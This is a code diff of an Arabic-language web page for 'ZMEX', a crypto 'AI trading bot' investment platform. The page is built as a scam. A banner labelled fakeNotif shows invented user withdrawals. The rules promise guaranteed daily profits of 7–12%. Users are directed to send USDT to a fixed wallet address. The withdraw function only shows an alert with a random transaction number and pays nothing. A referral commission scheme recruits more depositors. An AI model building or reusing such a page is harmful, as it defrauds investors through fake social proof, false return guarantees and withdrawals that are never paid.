@@ -5,34 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <title>ZMEX | PRO PLATFORM</title>
+    <title>ZMEX | التداول الاحترافي</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <style>
-        body { background-color: #f4f7f9; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        .tab-content { display: none; padding-bottom: 100px; }
-        .active-tab { display: block; animation: fadeIn 0.3s; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .nav-item { color: #94a3b8; cursor: pointer; transition: 0.3s; }
+        body { background-color: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; user-select: none; }
+        .tab-content { display: none; padding-bottom: 80px; }
+        .active-tab { display: block; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .nav-item { color: #94a3b8; transition: 0.3s; cursor: pointer; }
         .nav-item.active { color: #f59e0b; }
-        .notif-pop { position: fixed; top: 15px; left: 15px; right: 15px; background: rgba(0,0,0,0.9); color: white; padding: 12px; border-radius: 15px; font-size: 11px; z-index: 10000; display: none; border: 1px solid #f59e0b; }
+        .notif-box { position: fixed; top: 15px; left: 15px; right: 15px; background: rgba(15, 23, 42, 0.95); color: white; padding: 12px; border-radius: 15px; font-size: 11px; z-index: 10000; display: none; border-left: 4px solid #f59e0b; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+        .candlestick { width: 6px; border-radius: 2px; background: #22c55e; transition: height 0.5s; }
+        .candlestick.red { background: #ef4444; }
     </style>
 </head>
 <body>
 
-    <div id="fakeNotif" class="notif-pop shadow-2xl">
-        <i class="fas fa-check-circle text-green-500 ml-2"></i>
-        <span id="notifMsg">المستخدم ***5421 سحب 120.00 USDT بنجاح</span>
+    <div id="fakeNotif" class="notif-box">
+        <div class="flex items-center gap-3">
+            <div class="bg-green-500 w-2 h-2 rounded-full animate-ping"></div>
+            <span id="notifText">قام المستخدم ***8210 بسحب 350.00 USDT بنجاح ✅</span>
+        </div>
     </div>
 
     <div id="authScreen" class="min-h-screen flex flex-col items-center justify-center p-6 bg-[#0b0e11]">
-        <h1 class="text-5xl font-black text-[#ffbe00] mb-12 italic">ZMEX</h1>
+        <h1 class="text-6xl font-black text-[#ffbe00] mb-12 italic tracking-tighter">ZMEX</h1>
         <div class="w-full max-w-sm space-y-4">
-            <input type="text" id="regName" placeholder="الاسم الكامل" class="w-full p-4 rounded-xl bg-[#1e2329] text-white outline-none">
-            <input type="email" id="regEmail" placeholder="البريد الإلكتروني" class="w-full p-4 rounded-xl bg-[#1e2329] text-white outline-none">
-            <input type="password" id="regPass" placeholder="كلمة المرور" class="w-full p-4 rounded-xl bg-[#1e2329] text-white outline-none">
-            <button onclick="handleAuth()" class="w-full bg-[#ffbe00] py-4 rounded-xl font-black text-lg">دخول / تسجيل</button>
+            <input type="text" id="regName" placeholder="الاسم الكامل" class="w-full p-5 rounded-2xl bg-[#1e2329] text-white outline-none border-none focus:ring-2 ring-[#ffbe00]">
+            <input type="email" id="regEmail" placeholder="البريد الإلكتروني" class="w-full p-5 rounded-2xl bg-[#1e2329] text-white outline-none border-none focus:ring-2 ring-[#ffbe00]">
+            <input type="password" id="regPass" placeholder="كلمة المرور" class="w-full p-5 rounded-2xl bg-[#1e2329] text-white outline-none border-none focus:ring-2 ring-[#ffbe00]">
+            <button onclick="handleAuth()" class="w-full bg-[#ffbe00] py-5 rounded-2xl font-black text-lg active:scale-95 transition-all">ابدأ التداول الآن</button>
         </div>
     </div>
 
@@ -40,142 +44,175 @@
         
         <div id="home" class="tab-content active-tab p-5">
             <div class="flex justify-between items-center mb-6">
-                <span class="text-2xl font-black text-amber-500 italic">ZMEX</span>
-                <span id="displayUserName" class="text-xs font-bold bg-white px-4 py-1 rounded-full shadow-sm text-gray-600">...</span>
+                <span class="text-2xl font-black text-amber-500 italic">ZMEX PRO</span>
+                <span id="userNameTop" class="text-[10px] font-bold bg-white px-3 py-1 rounded-full text-slate-500 shadow-sm">...</span>
             </div>
 
-            <div class="bg-slate-900 text-white p-7 rounded-[2.5rem] mb-6 shadow-2xl relative overflow-hidden">
-                <p class="text-[10px] text-gray-400 uppercase tracking-widest">Available Balance</p>
-                <h2 class="text-3xl font-black italic mt-1">$<span id="uBalance">0.00</span></h2>
-                <div class="mt-4 flex gap-2">
-                    <span class="bg-green-500/20 text-green-400 text-[9px] px-2 py-1 rounded">الحساب مفعل</span>
+            <div class="bg-slate-900 text-white p-7 rounded-[2.5rem] mb-6 shadow-xl relative overflow-hidden">
+                <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">إجمالي الأصول المقدرة</p>
+                <h2 class="text-4xl font-black italic mt-2 text-amber-400">$<span id="uBalance">0.00</span></h2>
+                <div class="mt-4 inline-flex items-center gap-2 bg-green-500/10 text-green-400 text-[10px] px-3 py-1 rounded-full border border-green-500/20 font-bold">● نظام التداول نشط</div>
+                <i class="fas fa-chart-line absolute -bottom-5 -left-5 text-9xl opacity-10"></i>
+            </div>
+
+            <div class="bg-white p-5 rounded-3xl mb-8 shadow-sm border border-gray-100">
+                <div class="flex justify-between items-center mb-4">
+                    <b class="text-xs">مخطط السيولة المباشر</b>
+                    <span class="text-green-500 font-mono text-xs font-bold" id="liveTicker">$96,245.10 ▲</span>
                 </div>
-                <i class="fas fa-chart-line absolute -bottom-4 -left-4 text-8xl opacity-10"></i>
-            </div>
-
-            <div class="bg-white p-4 rounded-3xl mb-6 shadow-sm border border-gray-100">
-                <div class="flex justify-between mb-3"><b class="text-xs">تحليلات السوق الحية</b> <span class="text-green-500 text-[10px] font-bold" id="marketPrice">94,302.21+</span></div>
-                <div class="h-12 flex items-end justify-between px-2 gap-1">
-                    <div class="bg-green-500 w-full rounded-t" style="height: 40%"></div>
-                    <div class="bg-red-500 w-full rounded-t" style="height: 70%"></div>
-                    <div class="bg-green-500 w-full rounded-t" style="height: 50%"></div>
-                    <div class="bg-green-500 w-full rounded-t" style="height: 90%"></div>
-                    <div class="bg-red-400 w-full rounded-t" style="height: 30%"></div>
+                <div class="h-24 flex items-end justify-between gap-1 px-1">
+                    <div class="candlestick" style="height: 60%"></div>
+                    <div class="candlestick red" style="height: 40%"></div>
+                    <div class="candlestick" style="height: 80%"></div>
+                    <div class="candlestick" style="height: 50%"></div>
+                    <div class="candlestick red" style="height: 70%"></div>
+                    <div class="candlestick" style="height: 90%"></div>
+                    <div class="candlestick red" style="height: 30%"></div>
+                    <div class="candlestick" style="height: 85%"></div>
                 </div>
             </div>
 
             <div class="grid grid-cols-4 gap-4 mb-8 text-[10px] font-black text-center text-gray-600">
-                <div onclick="showTab('recharge', 'nav-recharge')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-wallet text-amber-500"></i></div>إيداع</div>
-                <div onclick="showTab('withdraw', 'nav-withdraw')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-money-bill-wave text-amber-500"></i></div>سحب</div>
-                <div onclick="showTab('invite')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-share-alt text-amber-500"></i></div>دعوة</div>
-                <div onclick="showTab('rules')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-file-contract text-amber-500"></i></div>القوانين</div>
-                <div onclick="showTab('markets', 'nav-markets')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-chart-pie text-amber-500"></i></div>السوق</div>
-                <div onclick="showTab('trade', 'nav-trade')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-robot text-amber-500"></i></div>البوتات</div>
-                <div onclick="showTab('support')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-headset text-amber-500"></i></div>الدعم</div>
-                <div onclick="showTab('profile', 'nav-profile')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-user-cog text-amber-500"></i></div>حسابي</div>
+                <div onclick="showTab('recharge', 'nav-recharge')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-wallet text-amber-500 text-lg"></i></div>إيداع</div>
+                <div onclick="showTab('withdraw', 'nav-withdraw')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-hand-holding-usd text-amber-500 text-lg"></i></div>سحب</div>
+                <div onclick="showTab('invite')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-user-plus text-amber-500 text-lg"></i></div>دعوة</div>
+                <div onclick="showTab('rules')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-book-open text-amber-500 text-lg"></i></div>القوانين</div>
+                <div onclick="showTab('markets', 'nav-markets')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-chart-pie text-amber-500 text-lg"></i></div>السوق</div>
+                <div onclick="showTab('trade', 'nav-trade')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-robot text-amber-500 text-lg"></i></div>تداول</div>
+                <div onclick="showTab('support')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-headset text-amber-500 text-lg"></i></div>الدعم</div>
+                <div onclick="showTab('profile', 'nav-profile')"><div class="bg-white p-4 rounded-2xl mb-1 shadow-sm"><i class="fas fa-id-card text-amber-500 text-lg"></i></div>حسابي</div>
             </div>
 
-            <h4 class="font-black text-sm mb-4">أفضل العملات اليوم</h4>
-            <div class="space-y-3" id="liveMarketList">
-                <div class="bg-white p-4 rounded-2xl shadow-sm flex justify-between items-center">
-                    <div class="flex items-center gap-3"><i class="fab fa-bitcoin text-orange-500 text-xl"></i><b>BTC/USDT</b></div>
-                    <div class="text-right"><p class="font-bold text-sm btc-val">$94,230</p><span class="text-green-500 text-[10px]">▲ 2.1%</span></div>
+            <h4 class="font-black text-sm mb-4">الأسواق العالمية الأكثر نشاطاً</h4>
+            <div class="space-y-3" id="allMarkets">
+                <div class="bg-white p-4 rounded-2xl flex justify-between items-center shadow-sm">
+                    <div class="flex items-center gap-3"><i class="fab fa-bitcoin text-orange-500 text-2xl"></i><b>BTC/USDT</b></div>
+                    <div class="text-right font-mono"><p class="font-black text-sm val-btc">$96,432</p><span class="text-green-500 text-[10px]">▲ 2.4%</span></div>
                 </div>
-                <div class="bg-white p-4 rounded-2xl shadow-sm flex justify-between items-center">
-                    <div class="flex items-center gap-3"><i class="fab fa-ethereum text-blue-500 text-xl"></i><b>ETH/USDT</b></div>
-                    <div class="text-right"><p class="font-bold text-sm eth-val">$3,421</p><span class="text-red-500 text-[10px]">▼ 0.4%</span></div>
+                <div class="bg-white p-4 rounded-2xl flex justify-between items-center shadow-sm">
+                    <div class="flex items-center gap-3"><i class="fab fa-ethereum text-blue-500 text-2xl"></i><b>ETH/USDT</b></div>
+                    <div class="text-right font-mono"><p class="font-black text-sm val-eth">$3,412</p><span class="text-red-500 text-[10px]">▼ 0.5%</span></div>
                 </div>
-                <div class="bg-white p-4 rounded-2xl shadow-sm flex justify-between items-center">
-                    <div class="flex items-center gap-3"><i class="fas fa-coins text-yellow-500 text-xl"></i><b>BNB/USDT</b></div>
-                    <div class="text-right"><p class="font-bold text-sm bnb-val">$612.40</p><span class="text-green-500 text-[10px]">▲ 1.8%</span></div>
-                </div>
-            </div>
-        </div>
-
-        <div id="support" class="tab-content p-5">
-            <div class="bg-white p-8 rounded-[2rem] shadow-xl text-center">
-                <i class="fas fa-comments text-5xl text-amber-500 mb-4"></i>
-                <h3 class="font-black text-xl mb-4">مركز الدعم المباشر</h3>
-                <textarea id="supportMsg" placeholder="اكتب مشكلتك هنا..." class="w-full p-4 bg-gray-50 border rounded-2xl h-32 outline-none mb-4"></textarea>
-                <button onclick="alert('تم إرسال رسالتك، سيقوم الدعم بالرد عليك قريباً'); showTab('home')" class="w-full bg-slate-900 text-white py-4 rounded-xl font-bold">إرسال الرسالة</button>
-            </div>
-        </div>
-
-        <div id="invite" class="tab-content p-5 text-center">
-            <div class="bg-white p-8 rounded-[2rem] shadow-xl">
-                <i class="fas fa-gift text-5xl text-amber-500 mb-4"></i>
-                <h3 class="font-black text-xl mb-2">ادعُ الأصدقاء</h3>
-                <p class="text-xs text-gray-400 mb-8">اربح عمولة تصل إلى 10% من كل إيداع لصديقك</p>
-                <div class="bg-gray-100 p-4 rounded-xl mb-6 font-mono text-xs">https://zmex.com/register?ref=77421</div>
-                <div class="grid grid-cols-2 gap-4">
-                    <button onclick="alert('تم نسخ الرابط!')" class="bg-amber-500 text-white py-3 rounded-xl font-bold"><i class="fas fa-copy ml-2"></i>نسخ</button>
-                    <button onclick="alert('جاري فتح تطبيقات المشاركة...')" class="bg-slate-900 text-white py-3 rounded-xl font-bold"><i class="fas fa-share-alt ml-2"></i>مشاركة</button>
-                </div>
-            </div>
-        </div>
-
-        <div id="rules" class="tab-content p-5">
-            <div class="bg-white p-6 rounded-[2rem] shadow-sm">
-                <h3 class="font-black text-xl mb-4 text-amber-500">قوانين المنصة وشرح البوتات</h3>
-                <div class="space-y-4 text-xs leading-relaxed text-gray-600">
-                    <p><b>1. بوتات التداول:</b> هي أنظمة ذكاء اصطناعي تقوم بتحليل الأسواق المالية (كريبتو، أسهم، فوركس) وتنفذ صفقات سريعة لضمان ربح يومي ثابت يتراوح بين 5% إلى 12% حسب نوع الباقة.</p>
-                    <p><b>2. الأسواق المالية:</b> نحن نتداول في أكبر البورصات العالمية ونعتمد على تقلبات الـ USDT لضمان استقرار رأس مال المستثمر.</p>
-                    <p><b>3. السحب والإيداع:</b> تتم معالجة طلبات السحب خلال 24 ساعة كحد أقصى لضمان أمان السيولة.</p>
-                    <p><b>4. تعدد الحسابات:</b> يمنع إنشاء أكثر من حساب لنفس الشخص لضمان نزاهة نظام الإحالات.</p>
-                </div>
-                <button onclick="showTab('home')" class="w-full bg-gray-100 py-3 rounded-xl mt-6 font-bold text-gray-400">فهمت ذلك</button>
-            </div>
-        </div>
-
-        <div id="withdraw" class="tab-content p-5">
-            <div class="bg-white p-8 rounded-[2rem] shadow-xl">
-                <h3 class="font-black text-xl mb-6 text-center">طلب سحب الأموال</h3>
-                <div class="space-y-4">
-                    <div>
-                        <label class="text-[10px] text-gray-400 mr-2">عنوان محفظة USDT (TRC20)</label>
-                        <input type="text" id="wAddr" placeholder="أدخل عنوان محفظتك" class="w-full p-4 bg-gray-50 rounded-xl outline-none border">
-                    </div>
-                    <div>
-                        <label class="text-[10px] text-gray-400 mr-2">المبلغ المراد سحبه</label>
-                        <input type="number" id="wAmount" placeholder="0.00" class="w-full p-4 bg-gray-50 rounded-xl outline-none border">
-                    </div>
-                    <button onclick="processWithdraw()" class="w-full bg-green-500 text-white py-4 rounded-xl font-black shadow-lg shadow-green-200">تأكيد طلب السحب</button>
-                </div>
-            </div>
-        </div>
-
-        <div id="recharge" class="tab-content p-5">
-            <div class="bg-white p-8 rounded-[2rem] shadow-xl">
-                <h3 class="font-black text-lg mb-6 text-center">شحن رصيد USDT</h3>
-                <div class="bg-amber-50 p-4 rounded-2xl mb-6 text-center border-2 border-dashed border-amber-200">
-                    <p class="text-[10px] text-amber-600 mb-2 font-bold uppercase">عنوان محفظة المنصة</p>
-                    <p class="text-[11px] font-mono break-all font-black text-slate-800 mb-3">TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2</p>
-                    <button onclick="copyMyAddr()" class="bg-slate-900 text-white px-6 py-2 rounded-lg text-xs font-bold">نسخ عنوان المحفظة</button>
-                </div>
-                <div class="space-y-4">
-                    <input type="number" id="rAmount" placeholder="أدخل المبلغ الذي شحنته" class="w-full p-4 bg-gray-50 rounded-xl outline-none border">
-                    <div class="p-4 bg-gray-50 rounded-xl border">
-                        <label class="text-[10px] text-gray-400 block mb-2">إرسال إثبات الشحن (صورة الحوالة)</label>
-                        <input type="file" id="rFile" class="text-[10px]">
-                    </div>
-                    <button onclick="alert('تم إرسال إثبات الشحن للمراجعة ✅'); showTab('home')" class="w-full bg-amber-500 text-slate-900 font-black py-4 rounded-xl">تأكيد الشحن والتحويل</button>
+                <div class="bg-white p-4 rounded-2xl flex justify-between items-center shadow-sm">
+                    <div class="flex items-center gap-3"><i class="fas fa-coins text-yellow-500 text-2xl"></i><b>BNB/USDT</b></div>
+                    <div class="text-right font-mono"><p class="font-black text-sm val-bnb">$654.20</p><span class="text-green-500 text-[10px]">▲ 1.1%</span></div>
                 </div>
             </div>
         </div>
 
         <div id="trade" class="tab-content p-5">
-            <h3 class="font-black mb-6 text-center text-xl">صناديق الاستثمار</h3>
+            <h3 class="font-black text-xl mb-6 text-center text-slate-800">صناديق التداول الذكية</h3>
             <div class="space-y-4">
-                <div class="bg-white p-6 rounded-3xl border-l-8 border-amber-500 shadow-sm">
-                    <div class="flex justify-between font-black"><span>BOT-100</span> <span>$100</span></div>
-                    <p class="text-green-500 text-xs mt-1">الربح اليومي: $8.50</p>
-                    <button onclick="showTab('recharge')" class="w-full bg-slate-900 text-white py-2 mt-4 rounded-xl text-xs font-bold">اشترك الآن</button>
+                <div class="bg-white p-6 rounded-3xl shadow-sm border-r-8 border-amber-500">
+                    <div class="flex justify-between items-start"><b>Bot Start-Up</b> <span class="bg-amber-100 text-amber-700 px-3 py-1 rounded-full text-[10px] font-bold">100 USDT</span></div>
+                    <p class="text-green-500 font-black text-lg mt-3">الربح اليومي: $8.50</p>
+                    <button onclick="showTab('recharge', 'nav-recharge')" class="w-full bg-slate-900 text-white py-3 rounded-xl mt-4 font-bold text-sm">تفعيل البوت</button>
                 </div>
-                <div class="bg-slate-900 text-white p-6 rounded-3xl border-l-8 border-amber-500 shadow-xl">
-                    <div class="flex justify-between font-black"><span>VIP-PRO</span> <span>$500</span></div>
-                    <p class="text-green-400 text-xs mt-1">الربح اليومي: $45.00</p>
-                    <button onclick="showTab('recharge')" class="w-full bg-amber-500 text-black py-2 mt-4 rounded-xl text-xs font-bold">اشترك الآن</button>
+                <div class="bg-white p-6 rounded-3xl shadow-sm border-r-8 border-green-500">
+                    <div class="flex justify-between items-start"><b>Bot Premium</b> <span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-[10px] font-bold">500 USDT</span></div>
+                    <p class="text-green-500 font-black text-lg mt-3">الربح اليومي: $45.00</p>
+                    <button onclick="showTab('recharge', 'nav-recharge')" class="w-full bg-slate-900 text-white py-3 rounded-xl mt-4 font-bold text-sm">تفعيل البوت</button>
                 </div>
+                <div class="bg-slate-900 text-white p-6 rounded-3xl shadow-xl border-r-8 border-amber-500">
+                    <div class="flex justify-between items-start"><b>Bot Whale V10</b> <span class="bg-amber-500 text-slate-900 px-3 py-1 rounded-full text-[10px] font-bold">1000 USDT</span></div>
+                    <p class="text-amber-500 font-black text-lg mt-3">الربح اليومي: $115.00</p>
+                    <button onclick="showTab('recharge', 'nav-recharge')" class="w-full bg-white text-slate-900 py-3 rounded-xl mt-4 font-bold text-sm">تفعيل البوت الملكي</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="withdraw" class="tab-content p-5">
+            <div class="bg-white p-8 rounded-3xl shadow-xl border-t-8 border-amber-500">
+                <h3 class="font-black text-xl mb-6 text-center text-slate-800">سحب الأرباح</h3>
+                <div class="space-y-5">
+                    <div>
+                        <label class="text-[10px] font-bold text-gray-400 mr-2 uppercase tracking-widest">عنوان محفظة المستلم (USDT TRC20)</label>
+                        <input type="text" id="wAddr" placeholder="أدخل عنوان محفظتك هنا" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:ring-2 ring-amber-500">
+                    </div>
+                    <div>
+                        <label class="text-[10px] font-bold text-gray-400 mr-2 uppercase tracking-widest">المبلغ المراد سحبه</label>
+                        <input type="number" id="wAmount" placeholder="0.00 USDT" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:ring-2 ring-amber-500">
+                    </div>
+                    <button onclick="handleWithdraw()" class="w-full bg-amber-500 text-slate-900 py-5 rounded-2xl font-black text-lg shadow-lg">تأكيد طلب السحب</button>
+                    <p class="text-[9px] text-gray-400 text-center italic">تتم معالجة السحوبات بشكل يدوي لضمان أمان أموالك، تستغرق من 2 لـ 24 ساعة.</p>
+                </div>
+            </div>
+        </div>
+
+        <div id="recharge" class="tab-content p-5">
+            <div class="bg-white p-8 rounded-3xl shadow-xl text-center">
+                <h3 class="font-black text-xl mb-6 text-slate-800">شحن الرصيد</h3>
+                <div class="bg-amber-50 p-6 rounded-3xl mb-8 border-2 border-dashed border-amber-200">
+                    <p class="text-[10px] text-amber-600 font-bold mb-3 uppercase tracking-tighter">عنوان إيداع المحفظة الخاص بالمنصة</p>
+                    <p class="text-[11px] font-mono font-black break-all text-slate-800 mb-4">TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2</p>
+                    <button onclick="navigator.clipboard.writeText('TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2');alert('تم نسخ العنوان!')" class="bg-slate-900 text-white px-8 py-2 rounded-full text-xs font-bold active:scale-90 transition-all">نسخ عنوان المحفظة</button>
+                </div>
+                <div class="space-y-4 text-right">
+                    <div>
+                        <label class="text-[10px] text-gray-400 font-bold mb-1 block">المبلغ الذي قمت بتحويله</label>
+                        <input type="number" id="depAmount" placeholder="مثال: 100 USDT" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none">
+                    </div>
+                    <div class="border-2 border-dashed p-4 rounded-2xl bg-gray-50">
+                        <label class="text-[10px] text-gray-400 block mb-2 font-bold">إرسال إثبات الشحن (صورة التحويل)</label>
+                        <input type="file" id="depFile" class="text-[10px] text-slate-500">
+                    </div>
+                    <textarea id="depMsg" placeholder="رسالة إضافية (اختياري)" class="w-full p-4 bg-gray-50 border rounded-2xl h-20 outline-none text-xs"></textarea>
+                    <button onclick="alert('تم إرسال إثبات الشحن والرسالة بنجاح ✅'); showTab('home', 'nav-home')" class="w-full bg-amber-500 text-slate-900 py-4 rounded-2xl font-black shadow-lg">تأكيد الإرسال والتحويل</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="invite" class="tab-content p-5">
+            <div class="bg-white p-8 rounded-3xl shadow-xl text-center">
+                <i class="fas fa-gift text-5xl text-amber-500 mb-4"></i>
+                <h3 class="font-black text-xl mb-2">برنامج الإحالة</h3>
+                <p class="text-xs text-gray-400 mb-8">شارك رابطك واربح 10% من استثمارات فريقك</p>
+                <div class="bg-gray-100 p-4 rounded-xl mb-6 font-mono text-[10px] text-gray-600">https://zmex-pro.com/ref?id=4821</div>
+                <div class="flex gap-4">
+                    <button onclick="alert('تم نسخ رابط الدعوة!')" class="flex-1 bg-amber-500 text-white py-3 rounded-xl font-bold"><i class="fas fa-copy mr-2"></i>نسخ الرابط</button>
+                    <button onclick="alert('جاري فتح قائمة المشاركة...')" class="flex-1 bg-slate-900 text-white py-3 rounded-xl font-bold"><i class="fas fa-share-alt mr-2"></i>مشاركة</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="rules" class="tab-content p-5">
+            <div class="bg-white p-6 rounded-3xl shadow-sm">
+                <h3 class="font-black text-xl mb-4 text-amber-500">قوانين المنصة وشرح العمل</h3>
+                <div class="space-y-4 text-xs leading-relaxed text-gray-600">
+                    <p class="border-b pb-2"><b>1. بوتات التداول:</b> هي أنظمة ذكاء اصطناعي تقوم بتحليل الأسواق المالية (كريبتو، أسهم، فوركس) وتنفذ صفقات سريعة لضمان ربح يومي ثابت للمستثمر يتراوح بين 7% لـ 12%.</p>
+                    <p class="border-b pb-2"><b>2. الأسواق المالية:</b> نحن نتداول في أكبر البورصات العالمية ونعتمد على تقلبات الـ USDT لضمان استقرار رأس مال المستثمر من أي مخاطر.</p>
+                    <p class="border-b pb-2"><b>3. السحب والإيداع:</b> تتم معالجة طلبات السحب خلال 24 ساعة كحد أقصى لضمان أمان السيولة المالية لجميع الأعضاء.</p>
+                    <p class="bg-amber-50 p-2 rounded"><b>ملاحظة:</b> الموقع يوفر فرصة للمبتدئين لبدء التداول بدون خبرة سابقة عبر تفعيل الصناديق الاستثمارية الجاهزة.</p>
+                </div>
+                <button onclick="showTab('home', 'nav-home')" class="w-full bg-slate-900 text-white py-3 rounded-xl mt-6 font-bold">فهمت ذلك</button>
+            </div>
+        </div>
+
+        <div id="support" class="tab-content p-5">
+            <div class="bg-white p-8 rounded-3xl shadow-xl text-center">
+                <i class="fas fa-headset text-5xl text-amber-500 mb-4"></i>
+                <h3 class="font-black text-xl mb-2">الدعم الفني المباشر</h3>
+                <p class="text-xs text-gray-400 mb-6">فريقنا متاح 24/7 لمساعدتك</p>
+                <div class="space-y-4">
+                    <textarea id="supMsg" placeholder="اكتب رسالتك هنا بوضوح..." class="w-full p-4 bg-gray-50 border rounded-2xl h-32 outline-none text-sm"></textarea>
+                    <button onclick="alert('تم إرسال رسالتك بنجاح، سيقوم الدعم بالرد عليك في حسابك قريباً'); showTab('home', 'nav-home')" class="w-full bg-slate-900 text-white py-4 rounded-xl font-bold">إرسال الرسالة للمراجعة</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="profile" class="tab-content p-5 text-center">
+            <div class="bg-white p-8 rounded-3xl shadow-sm mb-6">
+                <div class="w-20 h-20 bg-amber-100 rounded-full mx-auto mb-4 flex items-center justify-center text-amber-500 text-3xl">
+                    <i class="fas fa-user-circle"></i>
+                </div>
+                <h4 id="profName" class="font-black text-lg">...</h4>
+                <p id="profEmail" class="text-xs text-gray-400">...</p>
+                <div class="mt-4 bg-green-50 text-green-600 text-[10px] font-bold py-1 rounded-full px-4 inline-block">عضو VIP مفعل</div>
+            </div>
+            <div class="bg-white rounded-3xl overflow-hidden shadow-sm text-right">
+                <div class="p-4 border-b flex justify-between items-center"><span class="text-sm font-bold"><i class="fas fa-shield-alt ml-2 text-blue-500"></i> الأمان والخصوصية</span> <i class="fas fa-chevron-left text-xs text-gray-300"></i></div>
+                <div class="p-4 border-b flex justify-between items-center"><span class="text-sm font-bold"><i class="fas fa-history ml-2 text-green-500"></i> سجل العمليات</span> <i class="fas fa-chevron-left text-xs text-gray-300"></i></div>
+                <div onclick="location.reload()" class="p-4 flex justify-between items-center text-red-500"><span class="text-sm font-bold"><i class="fas fa-sign-out-alt ml-2"></i> تسجيل الخروج</span></div>
             </div>
         </div>
 
@@ -189,6 +226,7 @@
     </div>
 
     <script>
+        // تكوين Firebase الخاص بك
         const firebaseConfig = {
             apiKey: "AIzaSyAiw6jHMsmXn89X4okEMfUv9J44suexwEg",
             authDomain: "zmex-81334.firebaseapp.com",
@@ -201,15 +239,18 @@
         const auth = firebase.auth();
         const db = firebase.firestore();
 
-        let currentBalance = 0;
+        let userBalance = 0;
 
+        // ثبات تسجيل الدخول عند تحديث الصفحة
         auth.onAuthStateChanged(user => {
             if (user) {
                 db.collection('users').doc(user.uid).onSnapshot(doc => {
                     const data = doc.data();
-                    currentBalance = data.balance || 0;
-                    document.getElementById('uBalance').innerText = currentBalance.toFixed(2);
-                    document.getElementById('displayUserName').innerText = data.name;
+                    userBalance = data.balance || 0;
+                    document.getElementById('uBalance').innerText = userBalance.toFixed(2);
+                    document.getElementById('userNameTop').innerText = data.name;
+                    document.getElementById('profName').innerText = data.name;
+                    document.getElementById('profEmail').innerText = data.email;
                     document.getElementById('authScreen').classList.add('hidden');
                     document.getElementById('mainApp').classList.remove('hidden');
                 });
@@ -217,54 +258,60 @@
         });
 
         async function handleAuth() {
-            const n = document.getElementById('regName').value;
-            const e = document.getElementById('regEmail').value;
-            const p = document.getElementById('regPass').value;
-            if(!n || !e || !p) return alert("يرجى إكمال الحقول");
+            const name = document.getElementById('regName').value;
+            const email = document.getElementById('regEmail').value;
+            const pass = document.getElementById('regPass').value;
+            if(!name || !email || !pass) return alert("يرجى تعبئة كافة الحقول");
             try {
-                const res = await auth.createUserWithEmailAndPassword(e, p).catch(() => auth.signInWithEmailAndPassword(e, p));
-                await db.collection('users').doc(res.user.uid).set({name: n, email: e, balance: 0}, {merge: true});
-            } catch(err) { alert(err.message); }
+                const res = await auth.createUserWithEmailAndPassword(email, pass).catch(() => auth.signInWithEmailAndPassword(email, pass));
+                await db.collection('users').doc(res.user.uid).set({name: name, email: email, balance: 0}, {merge: true});
+            } catch(e) { alert(e.message); }
         }
 
-        function showTab(id, navId) {
+        function showTab(tabId, navId) {
             document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active-tab'));
-            document.getElementById(id).classList.add('active-tab');
+            document.getElementById(tabId).classList.add('active-tab');
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
             if(navId) document.getElementById(navId).classList.add('active');
         }
 
-        function copyMyAddr() {
-            navigator.clipboard.writeText('TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2');
-            alert('تم نسخ عنوان المحفظة!');
-        }
-
-        function processWithdraw() {
+        function handleWithdraw() {
             const amt = parseFloat(document.getElementById('wAmount').value);
-            if(amt > currentBalance || currentBalance <= 0) {
-                alert("عذراً، لا تملك رصيد كافي للسحب حالياً.");
+            if(amt > userBalance || userBalance <= 0) {
+                alert("عذراً، لا تملك رصيد كافي لسحبه من المنصة.");
             } else {
-                alert("تم تسجيل طلب السحب بنجاح. المبلغ قيد المراجعة.");
+                alert("تم تسجيل طلب السحب برقم العملية #ZM" + Math.floor(Math.random()*9999) + " سيتم السحب قريباً ✅");
             }
         }
